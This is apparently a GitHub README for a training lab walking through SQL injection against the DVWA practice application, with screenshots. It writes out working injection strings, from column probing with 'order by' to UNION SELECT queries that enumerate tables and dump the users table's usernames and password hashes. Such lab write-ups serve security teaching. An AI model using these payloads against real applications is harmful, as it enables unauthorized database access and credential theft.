# Perform-blind-SQL-injection-LAB
n an error-based SQL injection attack, the attacker uses the error output to determine how to inject SQL to attack the application. 

Click the + at the top to make a new tab in Chrome. Click the Blind SQL bookmark.

<img width="678" height="153" alt="image" src="https://github.com/user-attachments/assets/83becbc6-da79-4584-9472-6235427d5ae8" />

In the Enter User ID box, enter 1. Click Submit.

<img width="519" height="117" alt="image" src="https://github.com/user-attachments/assets/fcd41d36-e762-4590-a3e8-73c9eb492d43" />

The output is the user id and username

<img width="517" height="102" alt="image" src="https://github.com/user-attachments/assets/564c47ba-025d-4611-91e8-d388b8458ae4" />

In the Enter User ID box, enter:

' (apostrophe) 

No error is visible on the page. To check for an SQL vulnerability, brute-forcing is required

<img width="183" height="93" alt="image" src="https://github.com/user-attachments/assets/e32b47c8-0ef4-469c-88d4-9f7bff011874" />

To find the number of columns the database has, enter the following:

1' order by 1#

<img width="514" height="83" alt="image" src="https://github.com/user-attachments/assets/ae7c8d2b-19d5-4fe6-abb4-77522b7f6261" />

Since the statement is true, output is shown. The number of columns can be found by increasing the number until a blank output is returned. Increase the number to 3 and view the output:

1' order by 3#

The output is blank, so the table has 2 columns.

<img width="189" height="101" alt="image" src="https://github.com/user-attachments/assets/a8f4d559-277d-4798-b516-1c007fc9a164" />

Using the select and version() functions will display more information about the database. Enter the following:

1' OR 1=1 UNION SELECT 1, VERSION()#

<img width="364" height="135" alt="image" src="https://github.com/user-attachments/assets/2bdb2ad6-e4d7-4100-837c-4a17f34ea991" />


<img width="318" height="350" alt="image" src="https://github.com/user-attachments/assets/6c2984f7-5ee5-4b3d-b21e-fce17cf3a696" />

Get the name of the database using the following:

1' OR 1=1 UNION SELECT 1,DATABASE() #


<img width="332" height="351" alt="image" src="https://github.com/user-attachments/assets/f7dbf20f-169a-4b25-a45a-48e3e419f14c" />

With the database name, find the table names. Enter the following:

1' OR 1=1 UNION SELECT 1,table_name FROM  information_schema.tables WHERE table_type='base table' AND table_schema='dvwa' #

<img width="332" height="411" alt="image" src="https://github.com/user-attachments/assets/c17e814b-fba8-4633-9e1d-5f380dd0a1e3" />

Find information about the users table columns by entering:

1' OR 1=1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' #

<img width="439" height="811" alt="image" src="https://github.com/user-attachments/assets/beaa87c2-7960-4ddd-a0ef-9a40f8eaf557" />

Passwords are the most valuable information. Enter the following:

1' OR 1=1 UNION SELECT user, password FROM users #

<img width="501" height="528" alt="image" src="https://github.com/user-attachments/assets/1514a5a5-d0d0-4dbd-9a21-23f7646a5d5a" />



